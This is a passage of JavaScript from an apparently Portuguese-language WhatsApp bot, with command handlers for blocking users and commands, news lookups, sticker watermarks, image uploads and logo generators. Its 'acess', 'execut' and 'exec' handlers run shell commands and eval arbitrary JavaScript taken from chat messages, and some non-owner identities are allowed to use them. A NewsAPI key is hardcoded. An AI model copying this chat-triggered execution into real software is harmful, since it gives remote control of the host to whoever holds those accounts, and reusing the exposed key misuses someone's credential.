case 'fundosaiu':
if(!SoDono && !isnit && !info.key.fromMe) return reply(mess.onlyOwner())
if(!isQuotedImage) return reply("Marque uma imagem..")
reply('VocÃª deve marcar uma imagem com esse comando, se nÃ£o for de primeira, tente novamente, ok? ')
if((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && !q.length <= 1) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
logoslink.fundo2 = res
fs.writeFileSync("./yoko/configs/links_img.json", JSON.stringify(logoslink, null, 2));
reply(`A imagem de saiu foi alterado com sucesso para: ${res}`)
}
break

case 'antiligar':
case 'antiligacao':  
case 'antiligaÃ§Ã£o':  
if(!SoDono) return reply(mess.onlyOwner())
if(!isAnticall) {
nescessario.anticall = true
setNes(nescessario)
reply(`O anti ligaÃ§Ã£o foi ativado com sucesso. Caso alguÃ©m efetue uma ligaÃ§Ã£o para o bot serÃ¡ bloqueado.`)
} else if(isAnticall) {
nescessario.anticall = false
setNes(nescessario)
reply('O anti ligaÃ§Ã£o foi desativado com sucesso.')
}
break

case 'antipv':  
if(!SoDono) return reply(mess.onlyOwner())
if(!isAntiPv) {
nescessario.antipv = true
setNes(nescessario)
reply(`Antipv ativado com sucesso, caso alguÃ©m enviar mensagem para mim, irei bloquear!`)
} else if(isAntiPv) {
nescessario.antipv = false
setNes(nescessario)
reply('A funÃ§Ã£o antipv foi desabilitada com sucesso, agora todos podem me usar no pv.')
}
break

case 'antipv2':
if(!SoDono) return reply(mess.onlyOwner())
if(!isAntiPv2) {
nescessario.antipv2 = true
setNes(nescessario)
reply("Antipv2 ativado com sucesso, o pv pode ser usado, mas nÃ£o bloquearei, sÃ³ irei flodar a cada mensagem que ele enviar avisando..")
} else if(isAntiPv2) {
nescessario.antipv2 = false
setNes(nescessario)
reply("Antipv2 desativado com sucesso, agora o meu pv estÃ¡ totalmente liberado.")
}
break

case 'antipv3':
if(!SoDono) return reply(mess.onlyOwner())
if(!isAntiPv3) {
nescessario.antipv3 = true
setNes(nescessario)
reply("Antipv3 ativado com sucesso, irei ignorar todas as mensagens recebidas no pv, exceto: donos e usuÃ¡rios vip..")
} else if(isAntiPv3) {
nescessario.antipv3 = false
setNes(nescessario)
reply("Antipv3 desativado com sucesso, agora responderei todos sem preferÃªncia!")
}
break

case 'limitarcmd': case 'limitarcomando': case 'limitecmd':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
dataGp[0].Limitar_CMD = !dataGp[0].Limitar_CMD
setGp(dataGp);
reply(dataGp[0]?.Limitar_CMD ? "Limitador de comandos ativado com sucesso no grupo: "+groupName : "Limitador de comandos desativado no grupo: "+groupName)
break

case 'tempocmd':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!q.trim()) return reply(`Exemplo: ${prefix+command} 120\n60 = 1 minuto\nExemplo que coloquei, com o : ${prefix}limitarcmd ativo, sÃ³ podera usar comandos a cada 2 minutos\nBoa sorte.`)
dataGp[0].Limit_tempo = q.trim()
setGp(dataGp)
reply(`Tempo limite definido para: ${TimeCount(q.trim())} a cada comando.`)
break


case 'blockuser':
if(!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(mess.onlyOwner())
if(!q.length > 6) return reply("Marque o @ do usuÃ¡rio que deseja bloquear de ele utilizar os comandos, ou o nÃºmero da fÃ³rma que copiar...")
var blcp = q.replace(new RegExp("[()+-/ @+/]", "gi"), "")+"@s.whatsapp.net"
var numblc = ban.indexOf(blcp)
if(numblc >= 0) return reply('*Esse nÃºmero jÃ¡ esta incluso na lista de bloqueio.*')
ban.push(blcp)
fs.writeFileSync('./yoko/bunker/database/usuarios/banned.json', JSON.stringify(ban))
await yoko.sendMessage(from, {text: mess.bannedMessage(blcp), mentions: [blcp]})
break

case 'unblockuser':
if(!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(mess.onlyOwner())
if(!q.length > 6) return reply("Marque o @ do usuÃ¡rio que deseja desbloquear pra ele utilizar os comandos, ou o nÃºmero da fÃ³rma que copiar...")
var blcp = q.replace(new RegExp("[()+-/ @+/]", "gi"), "")+"@s.whatsapp.net"
var numbl = ban.indexOf(blcp)
if(numbl < 0) return reply('*Esse nÃºmero nÃ£o estÃ¡ incluso na lista de bloqueados.*')
pesquisar = blcp
processo = ban.indexOf(pesquisar)
while(processo >= 0){
ban.splice(processo, 1)
processo = ban.indexOf(pesquisar)
}
fs.writeFileSync('./yoko/bunker/database/usuarios/banned.json', JSON.stringify(ban))
await yoko.sendMessage(from, {text: mess.unbannedMessage(blcp), mentions: [blcp]})
break

case 'acess':
if(!SoDono && !isnit && !issupre && !ischyt) return reply(mess.onlyOwner())
teks = body.slice(7)
await exec(teks, async(err, stdout) => {
if(err) return await yoko.sendMessage(from, {text: `root@AKAMOficial:~ ${err}`}, {quoted: selo})
if(stdout) return await yoko.sendMessage(from, {text: stdout})
})
break

case 'execut':
if(!SoDono  && !isnit && !issupre && !ischyt) return reply(mess.onlyOwner())
try {
return eval(`(async() => { ${args.join(' ')}})()`)
} catch(error) {
await yoko.sendMessage(from, {text: `${error}`}, {quoted: selo})
}
break

case 'exec':
if(!SoDono  && !isnit && !issupre && !ischyt) return
try{
paramsQuoted = info.message.extendedTextMessage.contextInfo.quotedMessage.conversation || info.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;	
return await eval(`${paramsQuoted}`)
console.log(`[EXEC]~> ${paramsQuoted}`)
}catch(e){
reply(e)
}
break

case 'sender':
bla = isGroup ? info.key.participant : info.key.remoteJid
reply(bla)
break

case 'ping': 
await yoko.sendMessage(from, {react: {text: `ğŸƒğŸ»â€â™€ï¸`, key: info.key}})
const speedConverted = (Date.now() / 1000) - info.messageTimestamp;
ds = `âªâ˜‚ï¸ê¦¿á°§Í¢ğ’ğğ„ğ„ğƒ â†¯ ğğğ“à½ºâ‰­â€¢ÛŸ.â«\nàºŠ *LatÃªncia:* ${String(speedConverted.toFixed(3))} milisegundos.\nàºŠ *Uptime:* ${TimeCount(process.uptime())}\nâ€”\nâš™ï¸ *Sistema:*\nàºŠ Sistema Operacional: *${os.type()}*\nàºŠ VersÃ£o: *${os.release()}*\nàºŠ MemÃ³ria RAM Usada: *${(os.freemem()/Math.pow(1024, 3)).toFixed(2)} GB*\nàºŠ Total de MemÃ³ria RAM: *${(os.totalmem()/Math.pow(1024, 3)).toFixed(2)} GB*\nàºŠ Uso da CPU: *${os.loadavg()[0].toFixed(2)}%*\nàºŠ Uso da MemÃ³ria RAM: *${((os.totalmem() - os.freemem()) / os.totalmem() * 100).toFixed(2)}%*\nàºŠ VersÃ£o do NodeJS: *${process.version}*`
uptimeImage = await getBuffer(`https://eruakorl.sirv.com/Bot%20dudinha/ping.jpeg?text.0.text=VELOCIDADE DA BOT&text.0.position.gravity=north&text.0.position.y=15%25&text.0.size=40&text.0.font.family=Teko&text.0.font.weight=800&text.0.background.opacity=100&text.0.outline.blur=100&text.1.text=${String(speedConverted.toFixed(3))}&text.1.position.gravity=center&text.1.size=30&text.1.color=ffffff&text.1.font.family=Teko&text.1.font.weight=800&text.1.background.opacity=100&text.1.outline.blur=100`);
fs.writeFileSync(`./yoko/bunker/database/data/media/images/uptime-image.jpg`, uptimeImage);
yoko.sendIMG('./yoko/bunker/database/data/media/images/uptime-image.jpg', from, ds, {participant: sender, quotedMessage: info.message}
);
break 

                  
case 'gtts':
try {
if (args.length < 1) return await yoko.sendMessage(from,{text: `Cade o texto?, digite algo Exemplo:\n${prefix}gtts PT Oi`}, {quoted: selo})
const gtts = require('./yoko/bunker//funcoes/gtts.js')(args[0])
if (args.length < 2) return await yoko.sendMessage(from, {text: 'Falta colocar o cÃ³digo do idioma!'}, {quoted: selo})
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
if(dtt.length > 200) return reply('Para reduzir spam o mÃ¡ximo de letras permitidas sÃ£o 200!')
gtts.save(ranm, dtt, async function() {
await exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, async(err) => {
await yoko.sendMessage(from, {audio: fs.readFileSync(ranm), ptt:true, mimetype: "audio/mpeg"}, {quoted: selo}).catch(async(error) => {
return reply(mess.error())
})
DLT_FL(ranm); DLT_FL(rano)
})
})
} catch(error) {
return reply(mess.error())
}
break

case 'tagme':
const tagme = `@${sender.split("@")[0]} âœ”ï¸`
await mentions(tagme, [sender], true)
break

case 'avalie':
if(q.length < 1) return reply(`Exemplo: *${prefix}avalie* _â€œBot muito bom, parabÃ©ns.â€_`);
if(q.length > 400) return reply(`VocÃª *utrapassou* o mÃ¡ximo de 400 caracteres.`);
await sendMentions(nmrdn, `ğŸ“šâ™¦ï¸ *[AvaliaÃ§Ã£o]* - Recebi uma avaliaÃ§Ã£o do(a) usuÃ¡rio(a): *@${sender.split("@")[0]}*\n- Detalhes: _â€œ${q}â€_`);
await sendMentions(from, `OlÃ¡ *@${sender.split("@")[0]}*, enviei sua avaliaÃ§Ã£o para um dos meus superiores! AgradeÃ§o pelo uso contÃ­nuo de mim e pela avaliaÃ§Ã£o, vamos melhorar a cada dia sempre! â™¦ï¸ğŸ¤–`);
break

case 'bug':
if(q.length < 1) return reply('Campo vÃ¡zio? Por favor, descreva o erro ocorrido para ser solucionado pela minha equipe!');
if(q.length > 800) return reply(`VocÃª *utrapassou* o mÃ¡ximo de 800 caracteres.`);
await sendMentions(nmrdn, `ğŸ¤–âŒï¸ [ERROR] - O(a) usuÃ¡rio(a) *@${sender.split("@")[0]}* relatou a ocorrÃªncia de um erro ao utilizar um comando.\n- Detalhes: _â€œ${q}â€_`);
reply('Mensagem enviada ao meu superior, se enviar muitas mensagens repetida por zueiras, vocÃª serÃ¡ banido(a) de usar os comandos do bot.');
break

case 'sugestÃ£o': case 'sugestao':
if(q.length < 1) return reply(`Exemplo: *${prefix}sugestao* _â€œOpa, crie um comando tal, que ele funcione de tal maneira, isso serÃ¡ muito bom, nÃ£o sÃ³ pra mim, mas pra vÃ¡rios fazer isso..â€_`)
if(q.length > 800) return reply(`VocÃª *utrapassou* o mÃ¡ximo de 800 caracteres.`);
await sendMentions(nmrdn, `ğŸ“®â™¦ï¸ *[SugestÃµes]* - SugestÃµes de novos comandos, enviado pelo(a) usuÃ¡rio(a): *@${sender.split("@")[0]}*\n- Detalhes recebidos: _â€œ${q}â€_`);
reply("Mensagem enviada ao meu dono, obrigado pela sugestÃ£o, tentar ouvir o mÃ¡ximo possÃ­vel de sugestÃµes.");
break

case 'modoaluguel': case 'aluguel': case 'modorent':
if(!isGroup) return reply(mess.onlyGroup())
if(!SoDono) return reply(mess.onlyOwner())
if(args.length < 1) return reply('Aviso: 1 para ativar, 0 para desativar este recurso de forma global.')
if(Number(args[0]) === 1) {
if(isModoAluguel) return reply('Atualmente este modo jÃ¡ estÃ¡ ativado de forma global...')
nescessario.modo_aluguel = true
setNes(nescessario)
reply('Ativou com sucesso o modo aluguel global, agora todos os grupos que o bot estÃ¡ devem ser registrados para o bot funcionar perfeitamente para todos os participantes/adms do grupo, com meus proprietÃ¡rios nÃ£o haverÃ¡ nenhuma restriÃ§Ã£o de uso.')
} else if(Number(args[0]) === 0) {
if(!isModoAluguel) return reply('O modo aluguel global nÃ£o estÃ¡ ativo na configuraÃ§Ã£o.')
nescessario.modo_aluguel = false
setNes(nescessario)
reply('O modo aluguel foi desativado com sucesso, agora todos os comandos estarÃ£o funcionando para todos os participantes e adminstradores do grupo, sem a precisÃ£o de registrar o grupo no aluguel.')
} else {
reply('Aviso: 1 para ativar, 0 para desativar este recurso de forma global.')
}
break

case 'addcmdvip':
if(!SoDono) return reply(mess.onlyOwner())
tp = args.join(" ")
if(tp.includes("addcmdvip addcmdvip") || (tp.includes("addcmdvip  addcmdvip"))) return reply(`TÃ¡ louco maluco? NÃ£o tem como adicionar o mesmo comando.`)
if(isCmdVip.includes(args[0])) return reply('Este comando jÃ¡ estÃ¡ incluso na lista de comandos vip, verifique.')
isCmdVip.push(args[0])
fs.writeFileSync('./yoko/configs/nescessario.json', JSON.stringify(nescessario, null, 2))
reply(`O comando *${args[0]}* foi adicionado na lista de comandos vip.`)
break

case 'delcmdvip':
if(!SoDono) return reply(mess.onlyOwner())
tp = args.join(" ")
if(tp.includes("delcmdvip delcmdvip") || (tp.includes("delcmdvip  delcmdvip"))) return reply(`TÃ¡ louco maluco? NÃ£o tem como deletar o mesmo comando.`)  
if(!isCmdVip.includes(args[0])) return reply('Este comando jÃ¡ estÃ¡ excluÃ­do da lista de comandos vip.')
var i = isCmdVip.indexOf(args[0])
isCmdVip.splice(i, 1)
fs.writeFileSync('./yoko/configs/nescessario.json', JSON.stringify(nescessario, null, 2))
reply(`O comando *${args[0]}* foi tirado da lista de comandos vip.`)
break

case 'listacmdvip': case 'cmdviplist':
tkks = `[Total: *${isCmdVip.length}*] - Comandos que foram adicionados para uso Vip:\nâ€“\n`
tkks += isCmdVip.map((v, index) =>  `\tâ€¢ [ *NÂ° ${index+1}* ] - Comando: ${prefix+v}`).join('\nâ€“\n')
await yoko.sendMessage(from, {text: tkks.trim()}, {quoted: selo})
break

case 'blocklist':
if(ban.length == 0) return reply(`Existe *0* user(s) bloqueado(s), ou seja, nÃ£o existe ninguÃ©m.`)
tkks = `[Total: *${ban.length}*] - Lista de UsuÃ¡rios bloqueados pelo julgamento do(s) donos(as):\nâ€“\n`
tkks += ban.map((v, index) =>  `\tâ€¢ [ *NÂ° ${index+1}* ] - UsuÃ¡rio: @${v.split('@')[0]}`).join('\nâ€“\n')
await yoko.sendMessage(from, {text: tkks.trim(), mentions: ban}, {quoted: selo})
break

case 'blockcmdgp':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
tp = args.join(" ")
if(tp.includes("blockcmd blockcmd") || (tp.includes("blockcmd  blockcmd"))) return reply(`TÃ¡ louco maluco?, Quer banir o comando de bloquear comando?`)
if(getComandoBlock(from).includes(args[0]))return reply('Este comando jÃ¡ estÃ¡ bloqueado.')
await addComandos(from, args[0])
reply(`O comando *${args[0]}* foi bloqueado no grupo com sucesso.`)
break

case 'unblockcmdgp':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
tp = args.join(" ")
if(tp.includes("blockcmd unblockcmd") || (tp.includes("blockcmd  unblockcmd"))) return reply(`TÃ¡ louco maluco?, Quer banir o comando de desbloquear comando?`)  
if(!getComandoBlock(from).includes(args[0])) return reply('Este comando jÃ¡ estÃ¡ desbloqueado.')
await deleteComandos(from, args[0])
reply(`O comando *${args[0]}* foi desbloqueado com sucesso no grupo.`)
break

case 'listblockcmdgp': case 'listbcmdgp':
if(!isGroup) return reply(mess.onlyGroup());
if(getComandoBlock(from).length == 0) return reply("NÃ£o existe ainda nenhum *comando bloqueado* neste grupo.");
tkks = `[Total: *${getComandoBlock(from).length}*] - Comandos bloqueados pelo adminstrador(s) do grupo:\nâ€“\n`
tkks += getComandoBlock(from).map((v, index) =>  `\tâ€¢ [ *NÂ° ${index+1}* ] - Comando: ${prefix + getComandoBlock(from)[v]}`).join('\nâ€“\n')
await yoko.sendMessage(from, {text: tkks.trim()}, {quoted: selo})
break

case 'blockcmdg':
if(!SoDono) return reply(mess.onlyOwner())
tp = args.join(" ")
if(tp.includes("blockcmdg blockcmdg") || (tp.includes("blockcmdg  blockcmdg"))) return reply(`TÃ¡ louco maluco? NÃ£o tem como adicionar o mesmo comando.`)
if(isBlockCmdG.includes(args[0])) return reply('Este comando jÃ¡ estÃ¡ incluso na lista de *comandos bloqueados global*.')
isBlockCmdG.push(args[0])
fs.writeFileSync('./yoko/configs/nescessario.json', JSON.stringify(nescessario, null, 2))
reply(`O comando *${args[0]}* foi adicionado na lista de comandos bloqueados global.`)
break

case 'unblockcmdg':
if(!SoDono) return reply(mess.onlyOwner())
tp = args.join(" ")
if(tp.includes("unblockcmdg unblockcmdg") || (tp.includes("unblockcmdg  unblockcmdg"))) return reply(`TÃ¡ louco maluco? NÃ£o tem como desbloquear o mesmo comando.`)  
if(!isBlockCmdG.includes(args[0])) return reply('Este comando nÃ£o estÃ¡ incluso na lista de *cmds bloqueados global*.')
var ab = isBlockCmdG.indexOf(args[0])
isBlockCmdG.splice(ab, 1)
fs.writeFileSync('./yoko/configs/nescessario.json', JSON.stringify(nescessario, null, 2))
reply(`O comando *${args[0]}* foi tirado da lista de cmds bloqueados global.`)
break

case 'listbcmdglobal':
if(isBlockCmdG.length == 0) return reply("NÃ£o existe nenhum *comando bloqueado* na lista.")
tkks = `[Total: *${isBlockCmdG.length}*] - Lista de comandos bloqueados pelo(s) meus proprietÃ¡rios:\nâ€“\n`
tkks += isBlockCmdG.map((v, index) =>  `\tâ€¢ [ *NÂ° ${index+1}* ] - Comando: ${prefix+v}`).join('\nâ€“\n')
await yoko.sendMessage(from, {text: tkks.trim()}, {quoted: selo})
break



case 'noticias': case 'getnoticias':
try {
if (!q) return reply(`Informe um tema para realizar a pesquisa de suas notÃ­cias!`)
theNews = await axios.get(`https://newsapi.org/v2/everything?q=${encodeURIComponent(q)}&sortBy=publishedAt&language=pt&apiKey=9dc1dde158804756ae9b33dd8d71f7a1`);
d = await pickRandom(theNews.data.articles)

reply(`> *${d.title}* - ${d.author} [${d.source.name}]\nâ€“\nâ€¢ DescriÃ§Ã£o: *${d.description}*\nâ€¢ Postagem: *${d.publishedAt.split('T').join(' - ').split('Z')[0]}*\nâ€¢ URL: *${d.url}*`)
} catch (error) {
return reply(mess.error())
}
break

case 'googlenews': case 'gnews':
try {
idioma = "pt-br"; // Idioma: PortuguÃªs do Brasil
country = "BR"; // Mude a sigla para qual vocÃª quiser puxar as notÃ­cias.
dataNews = await fetchJson(`https://delirius-api-oficial.vercel.app/api/noticias?language=${idioma}&country=${country}`);
NTD = pickRandom(dataNews.headline_stories);
await reply(`> Google NotÃ­cias - Brasil:\nâ€“\nâ€¢ TÃ­tulo: *${NTD.title}*\nâ€¢ Postagem por: *${NTD.by}* | ${NTD.published}\nâ€“\nâ€¢ URL: *${NTD.url}*`);
} catch(e) {
return await reply(mess.error());
}
break

case 'cases':
if(!SoDono) return reply(mess.onlyOwner())
try {
const listCases = () => {
const fileContent = fs.readFileSync("index.js").toString();
const caseNames = fileContent.match(/case\s+'(.+?)'/g);
if (caseNames) {
return caseNames.map((caseName, index) => `${index + 1}. ${caseName.match(/'(.+?)'/)[1]}`).join('\n');
} else {reply("Nenhuma case encontrada.")}}
yoko.sendMessage(from, {text: listCases()}, { quoted: selo});
} catch(e) {reply('Ocorreu um erro ao obter as cases.')}
break



case 'take':
if(!isQuotedSticker) return reply('VocÃª usou de forma errada... Marque uma figurinha.')
try {
i8 = rgtake.map(i => i.usuario).indexOf(sender)
if(i8 < 0) return reply(`VocÃª ainda nÃ£o definiu a sua marca ÄÃ¡gua personalizada para o uso desse comando.\nâ€¢ Por favor, use o comando *${prefix}rgtake sb|bot* para registrar sua marca Äagua personalizada de seus stickers.`)
encmediats = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
bas64 = `data:image/jpeg;base64,${encmediats.toString('base64')}`
var mantap = await convertSticker(bas64, `${rgtake[i8].mcdagua2}`, `${rgtake[i8].mcdagua1}`)
var sti = new Buffer.from(mantap, 'base64');
await yoko.sendMessage(from, {sticker: sti, contextInfo: {externalAdReply:{title: `Renomeado com sucesso para: ${rgtake[i8].mcdagua1}|${rgtake[i8].mcdagua2}`,body:"", previewType:"PHOTO",thumbnail: sti}}})
} catch(error) {
reply(mess.error())
}
break

case 'rgtake':
var [TP, TP2] = q.split("|")
rgtakergtake = []
for (i of rgtake) {rgtakergtake.push(i.usuario)}
if(rgtakergtake.indexOf(sender) >= 0) return reply("VocÃª jÃ¡ registrou sua marca Äagua, nÃ£o Ã© possÃ­vel usar esse comando novamente.")
if(!q.includes("|")) return reply(`VocÃª usou de forma errada, siga o exemplo: *${prefix + command} sb|bot*`)
if(!TP) return reply(`VocÃª esqueceu de preencher o primeiro campo... Ex: *${prefix + command} sb|bot*`)
if(!TP2) return reply(`VocÃª esqueceu de preencher o segundo campo... Ex: *${prefix + command} sb|bot*`)
rgtake.push({usuario: sender, mcdagua1: TP, mcdagua2: TP2})
fs.writeFileSync("./yoko/bunker/database/usuarios/take.json", JSON.stringify(rgtake, null, 2))
reply(`Sucesso ao concluir o registro... Agora vocÃª pode usar o comando: *${prefix}take*`)
break

case 'rntake':
i8 = rgtake.map(i => i.usuario).indexOf(sender)
if(i8 < 0) return reply(`Como vocÃª quer renomear algo que vocÃª nÃ£o tem registro?`)
if(!q.includes("|")) return reply(`VocÃª usou de forma errada, siga o exemplo: *${prefix + command} sb|bot*`)
var [MARCAD1, MARCAD2] = q.split("|")
if(!MARCAD1) return reply(`VocÃª esqueceu de preencher o primeiro campo... Ex: *${prefix + command} sb|bot*`)
if(!MARCAD2) return reply(`VocÃª esqueceu de preencher o segundo campo... Ex: *${prefix + command} sb|bot*`)
rgtake[i8].mcdagua1 = MARCAD1
rgtake[i8].mcdagua2 = MARCAD2
fs.writeFileSync("./yoko/bunker/database/usuarios/take.json", JSON.stringify(rgtake, null, 2) + '\n')
reply(`Sua marca ÄÃ¡gua foi alterada para *"${MARCAD1}|${MARCAD2}"* com sucesso.`)
break

case 'gerarlink':
try {
if((isMedia && !info.message.videoMessage || isQuotedImage) && !q.length <= 1) { 
await reagir(from, "ğŸ˜¸"); /* ReaÃ§Ã£o para aguadar o sucesso da solicitaÃ§Ã£o... 'ğŸ˜¸' */
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage;
owgi = await getFileBuffer(boij, 'image');
await yoko.sendMessage(from, {text: `â€¢ Link gerado: *${await upload(owgi)}*`}, {quoted: selo});
await reagir(from, "âœ…ï¸"); /* Sucesso? Vai reagir a mensagem com o emoji 'âœ…ï¸' */
} else if((isMedia && info.message.videoMessage.seconds < 30 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 30) && !q.length <= 1) { 
await reagir(from, "ğŸ˜¸"); /* ReaÃ§Ã£o para aguadar o sucesso da solicitaÃ§Ã£o... 'ğŸ˜¸' */
boij = isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : info.message.videoMessage;
owgi = await getFileBuffer(boij, 'video');
await yoko.sendMessage(from, {text: `â€¢ Link gerado: *${await upload(owgi)}*`}, {quoted: selo});
await reagir(from, "âœ…ï¸");  /* Sucesso? Vai reagir a mensagem com o emoji 'âœ…ï¸' */
} else {
await reagir(from, "ğŸ˜¿"); /* Triste? NÃ£o mencionou nada ou nÃ£o seguiu as diretrizes... */
reply("VocÃª deve marcar uma imagem, ou um vÃ­deo de atÃ© 30 segundos..");
}
} catch {
await reagir(from, "âŒï¸"); /* ApÃ³s as solicitaÃ§Ãµes ocorrer um erro, reagir com com 'âŒï¸'. */
reply(mess.errorUploadImage());
}
break
case 'gerarlink2': case 'imgpralink2': {
if((isMedia && info.message.imageMessage) || isQuotedImage) {
reply('â¯â¯AGUARDE...â®â®')
var Fl = info?.message?.extendedTextMessage?.contextInfo?.quotedMessage
var muk = Fl?.viewOnceMessageV2?.message?.imageMessage || Fl?.viewOnceMessage?.message?.imageMessage || Fl?.imageMessage;
let base64String = await getFileBuffer(muk, "image");
var abcd = await uploadX(base64String)
reply(`Link da imagem: ${abcd}`);
} else {
return reply("Marque uma imagem, para que eu possa converter em link.")
}
}
break;

// LOGOS 

case 'cria': 
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_api.jpg?text.0.text=${teks}&text.0.color=000000&text.0.font.family=Pacifico&text.0.font.weight=600&text.0.background.color=ffffff&text.0.outline.color=ffffff&text.0.outline.width=10&text.0.outline.blur=17`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break

case 'anime1':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis2.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=1%25&text.0.position.y=16%25&text.0.size=80&text.0.color=ff2772&text.0.opacity=67&text.0.font.family=Bangers&text.0.font.style=italic&text.0.background.opacity=50&text.0.outline.width=6`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break

case 'ff1':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis3.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=59%25&text.0.size=89&text.0.color=000000&text.0.opacity=71&text.0.font.family=Changa%20One&text.0.font.style=italic&text.0.background.opacity=10&text.0.outline.color=ffffff&text.0.outline.width=3`)
yoko.sendMessage(from, { image: yurimodz }, {quoted: selo })
break	

case 'game':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis5.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=1%25&text.0.position.y=22%25&text.0.align=left&text.0.size=59&text.0.font.family=Permanent%20Marker&text.0.outline.color=df00ff&text.0.outline.width=2&text.0.outline.blur=18`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break

case 'ff2':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis6.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.x=1%25&text.0.position.y=50%25&text.0.size=68&text.0.color=464646&text.0.opacity=51&text.0.font.family=Sigmar%20One&text.0.background.opacity=2&text.0.outline.color=ffffff&text.0.outline.width=2&text.0.outline.opacity=61`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break	

case 'anime2':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis7.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.x=1%25&text.0.position.y=58%25&text.0.size=69&text.0.color=00ffea&text.0.opacity=37&text.0.font.family=Bangers&text.0.background.opacity=77&text.0.outline.color=ffffff&text.0.outline.width=2&text.0.outline.blur=20`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break

case 'entardecer':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis9.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=50%25&text.0.size=68&text.0.color=ffffff&text.0.opacity=61&text.0.font.family=Tangerine&text.0.font.style=italic&text.0.background.opacity=61&text.0.outline.color=ff6f00&text.0.outline.width=9`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break

case 'indian':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
